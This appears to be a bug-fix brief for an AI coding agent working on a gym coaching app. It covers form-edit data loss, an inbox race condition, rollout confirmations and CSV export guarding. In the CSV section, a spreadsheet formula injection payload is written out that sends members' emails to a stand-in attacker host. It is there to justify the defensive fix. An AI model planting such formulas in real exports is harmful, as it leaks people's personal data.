# Brief 04: Coach app: the confirmed high-risk bugs (app code)

**Goal:** fix the coach-side bugs that were **reproduced live** or that can lose or misdeliver data, plus the smaller bugs on the same screens. Three of them (R3, R4, R5) are the highest-priority app fixes in the whole audit.

**Migration number reserved:** `0135` (forms save function and event notification function only).
**Depends on:** brief 03 (`schedule_programme_rollout`, `import_program_template`, `retire_class`, trigger errors). If brief 03 is not merged yet, do the interim version described in each item and leave a clearly marked `// TODO(brief 03)`.
**Read for evidence:** `docs/AUDIT_ROUND_2.md` (R3, R4, R5, R24, R25, R26, R29, R33, R35), `docs/COACH_OWNER_AUDIT.md` (CH2, CM1, CL3), the "Smaller items: coach and owner screens" list in `AUDIT_ROUND_2.md`.

## Ground rules (same in every brief)

1. Read `CLAUDE.md`. The stack is fixed. `lib/calculations.ts` formulas must not change.
2. **Never write to the live database or run seed or stress scripts.** `.env.local` points at the live project. In a browser do **not** click Save, Send, Delete or Assign against live data. Verify with unit tests (the repo has `vitest` only, no component-test library; extract pure logic into testable helpers. Adding `@testing-library/react` + `jsdom` is allowed but ask the owner first), or ask the owner to point `.env.local` at a sandbox.
3. Never edit an existing migration. New file `0135_*.sql` only, idempotent, `security definer` functions with `set search_path = public`, NULL-safe checks, revoke from `public, anon`.
4. `npm test`, `npx tsc --noEmit`, `npm run lint` must pass.
5. Stay inside this brief's files (see `00-README.md` ownership table). No secrets or personal data. One commit per finding, imperative message, do not push.
6. For each **DECISION Dn** (`12-owner-tasks-and-decisions.md`) implement the recommended default and say so.
7. Finish by appending a `## Status` section to this file (ID, done/partly/skipped, commit, what the owner must check).

## R3. Editing a form deletes every answer ever submitted (High, confirmed live, DECISION D14)

- **Where:** `lib/data/forms.ts:73-109` (`updateFormTemplate`): deletes every `form_questions` row of the template and re-inserts new ones with new ids. `supabase/migrations/0008_onboarding_forms.sql:92`: `form_responses.question_id references form_questions(id) on delete cascade`. Editor: `app/coach/library/_components/FormsPane.tsx` (`FormEditorOverlay`, `QuestionDraft` has no id).
- **Proof (live, 15 Oct, throwaway form):** one answer saved; after a one-word edit the question id changed, the assignment still said "Completed", and the answer count went from 1 to 0.
- **Change:**
  1. Migration `0135`: `form_questions.archived_at timestamptz null`, and a function `save_form_template(p_template_id uuid, p_fields jsonb, p_questions jsonb) returns uuid` (`security definer`, caller coaches in the template's gym) that, **in one transaction**: updates the template; **updates in place** every question whose id is in the payload (text, type, options, required, order_index); inserts questions with no id; and for every existing question missing from the payload either **deletes** it if it has no responses or sets `archived_at = now()` if it has. If the type of an answered question changes, archive the old one and insert a new one. Keep the "only one default onboarding form per gym" behaviour of the current code.
  2. `lib/data/forms.ts`: `updateFormTemplate` calls the function (one request). `createFormTemplate` may stay. Add `id` to the question type and the editor state; `getFormTemplateWithQuestions` returns ids and an `answerCount` per question; hide archived questions from the **member fill-out** list and from new assignments, but **show them to the coach** on a member's completed form with an "archived question" label so old answers stay readable.
  3. Editor UI: show "N answers" beside a question that has them; deleting such a question says "Its answers stay on file for you, members won't see it again." Add up/down reorder buttons (there is no reorder today) and one-option-per-line entry for choice questions (the comma-separated box cannot hold an option with a comma); a choice question with no options must not save.
  4. Extract the diff logic that turns the editor state into the payload into `lib/formEdit.ts` with unit tests (keep, add, remove with answers, remove without answers, type change).
- **Acceptance:** a test (SQL check script in `supabase/tests/security-audit/` style, sandbox only) that saves a form with one answered question, edits a word, and finds the **same question id** and the **answer still there**; the unit tests above pass.

## R4. Coach inbox can show the wrong member's conversation (High, confirmed live)

- **Where:** `app/coach/_components/useCoachMessages.ts` (`selectClient`: awaits `getMessages(clientId)` then sets `messages` and `loading=false` for whatever client that was); `app/coach/messages/_components/MessagesHubShell.tsx` and `app/coach/_components/MessagesDrawer.tsx` mount `<ChatTab key={selected} initialMessages={messages}>`; `app/dashboard/_components/ChatTab.tsx:133` does `useState(initialMessages)` and never re-syncs.
- **Proof (live):** click Barbara's conversation, go back, click John's, 120 ms apart; the window headed "John Harris" showed Barbara's reply. Server actions run one at a time, so the first response always lands after the second click.
- **Change:**
  1. In `selectClient`, keep a request counter (or compare `selectedRef.current`); apply `setMessages` / `setLoading(false)` only when the result is for the **currently selected** client. Set `selected`, `messages` and `loading` together.
  2. Safety net: key `ChatTab` on `${selected}:${loadId}` and, in `ChatTab`, reset `messages` when `clientId` or the initial list identity changes (touch `ChatTab.tsx` **minimally**; brief 07 edits the same file later).
  3. Put the "only the latest request wins" logic in a tiny pure helper (`lib/latestOnly.ts`) and unit-test it with out-of-order resolutions.
- **Acceptance:** unit test of out-of-order resolution passes; manual check on a sandbox: two quick clicks always show the second member's own messages.

## R29. Messages screen side effects and gaps (Medium)

- **Opening the page marks the newest conversation read.** `MessagesHubShell.tsx` selects `overview[0]` on desktop at mount; `ChatTab`'s open effect (`ChatTab.tsx:221-225`) calls `markChatRead`. **Change:** do not auto-select; show "Choose a conversation".
- **A member's first ever message never appears live.** `useCoachMessages.ts` only subscribes for conversations with `last_message_at != null`, and the default "active" filter hides empty ones. **Change:** refetch `getCoachChatOverview` when the tab regains focus and every 60 seconds while the page is open, and merge new threads into the list.
- **Channel limit.** One realtime channel per active conversation will hit Supabase's per-connection limit (about 100). **Change:** subscribe to the 40 most recent conversations plus the open one; rely on the refetch for the rest.
- **Drawer never recovers from an error.** `MessagesDrawer.tsx` calls `getCoachChatOverview().then(...)` with no catch; add an error state with a Retry button.
- **Acceptance:** opening `/coach/messages` on a wide screen changes no unread counts; unit-test the merge helper.

## R5. "Start a programme" can replace everyone's programme in one tap (High, confirmed live)

- **Where:** `app/coach/library/_components/ProgramTemplateManager.tsx` (the "Start this programme" sheet), `lib/data/programTemplates.ts:435-470` (`scheduleProgrammeRollout`).
- **Proof (live, by looking):** the sheet opens with "Everyone at the gym" selected, start date today, main button "Start for everyone today", no count, no confirmation.
- **Change:** default to **Choose members**; when "Everyone" is picked show the real count ("This will replace the current programme for 90 members") and require a confirmation dialog; the button text shows the count; after success show "Started for N members". Call the new `schedule_programme_rollout` RPC from brief 03 (one transaction: no queued rollout survives a failure). **Interim, if brief 03 is not merged:** after a failed apply, delete the rollout row you just inserted.
- **Related (PT3):** `deleteTemplateWeek` leaves a gap in the week numbers (deleting week 2 of 4 leaves 1, 3, 4, so members get an empty programme week): renumber the later weeks in the same call. **(CL3)** call `import_program_template` instead of inserting piece by piece.
- **Acceptance:** unit test for the confirmation wording/count helper; the default audience is `selected`.

## R25. Broadcast "Send now" only confirms for the whole gym (Medium)

- **Where:** `app/coach/messages/_components/BroadcastsPane.tsx:159`. "My clients" or a group, with channel Email or Both, sends on one click: no count in a confirmation, no preview, no recall; no delivery report afterwards.
- **Change:** always confirm a "send now" with the count and the channel ("Send to 90 members by message and email?"), stronger wording for email. Show the result after sending (sent, failed) once brief 09 returns it. A past schedule time is rejected (`min` on the date input); show the date and weekday in the **gym's** timezone, not the browser's. Add a visible note that scheduled sends go out at the next daily run (until brief 09 changes the schedule).
- **Not in this brief:** the audience **count** being wrong for a multi-gym coach (brief 05, R38).

## R26 and CH2 (UI). Timetable edits and session deletion (High/Medium)

- **Where:** `app/coach/classes/_components/TimetableView.tsx` (`save`, `remove`), `lib/data/classes.ts` (`updateClass`, `deleteClass`).
- **Change:** replace **Delete** with **Retire** that calls brief 03's `retire_class`; the confirmation states how many upcoming members will be refunded and notified. Before saving a change to a slot that has future bookings, show "N members are booked; they will be notified"; show the trigger's friendly error for capacity below the booked count. One-off sessions cannot be created in the past (`min` on the date input). Cancelling a single date still goes through Sessions.
- **SV1 (UI):** `RunClassView` "Mark everyone attended" is disabled for future dates with a message (the database refuses too).

## R24. CSV exports are not protected against spreadsheet formulas (Medium)

- **Where:** two helpers exist. `lib/csv.ts` prefixes cells that start with `=`, `+`, `-` or `@` with `'`. `lib/utils/csv.ts` does **not**; it is used by `ClientTable.tsx:10` (roster: member-typed names and emails) and `ExerciseLibraryManager.tsx:23`; `app/coach/classes/_components/ReportsPane.tsx` has a private unguarded copy for the no-show and class-popularity downloads.
- **Why it matters:** a member who sets their name to `=IMAGE("https://evil.example/?d="&B2&B3)` makes the coach's spreadsheet send other members' emails off-site when opened in Google Sheets.
- **Change:** make `lib/utils/csv.ts`'s `toCsv` the guarded one (re-export from `lib/csv.ts`; keep `parseCsv`, `headerIndex`, `downloadTextFile` working for `ImportClientsButton`), delete the private copy in `ReportsPane.tsx` and use it, and add a UTF-8 byte-order mark in `downloadTextFile` so accented names open correctly in Excel. Extend `lib/csv.test.ts`.
- **Acceptance:** a test that every cell starting with `= + - @`, a tab or a carriage return is prefixed, including inside the roster export.

## Smaller items on the same screens

- **R33 (UI), groups:** `GroupsManager.tsx`: show a friendly message if a delete is refused; history shows "(deleted group)" when the group is gone (brief 03 keeps the saved name); add search and "select all" to the member picker.
- **FM2/ED:** form editor items are under R3. Education: validate lesson `link_url` is `https://` (`EducationPane.tsx`, `lib/data/education.ts`); module and lesson delete confirmations mention that members' progress is removed.
- **EX (exercise library), `ExerciseLibraryManager.tsx`:** CSV import: skip rows whose name and equipment already exist, cap at 500 rows, reject non-`https` links; the delete confirmation must not promise "programmes are unaffected": a used exercise cannot be deleted, so show "In use by N programme templates; retire it instead" (uses `is_active` from brief 02).
- **EV2 (events), `CommunityShell.tsx`, `lib/data/community.ts`:** editing an event's time or place, or deleting it, notifies everyone signed up (new `notify_event_signups` function in `0135`; message text includes the event title and what changed); past events cannot be created (`min`); show a "Cancelled" state instead of silently removing it if you can do so without a schema change, otherwise notify and delete.
- **R35 (live data, owner task):** not code. See brief 12.
- **PK1/PK2 (plans), `PackageManager.tsx`:** unticking every screen saves "no screens": require at least one; a blank credits-per-week saves 0: require a number; trim the plan name.
- **GM/CR minor:** "Extra session" and "Grant pack" in `CreditsTab.tsx` are brief 05.

## Definition of done

- Every item above implemented or explicitly skipped with a reason in `## Status`; unit tests for `formEdit`, `latestOnly`, the confirmation helper and the CSV guard; migration `0135` plus its sandbox check.
- No change to files owned by other briefs except the minimal `ChatTab.tsx` edit.
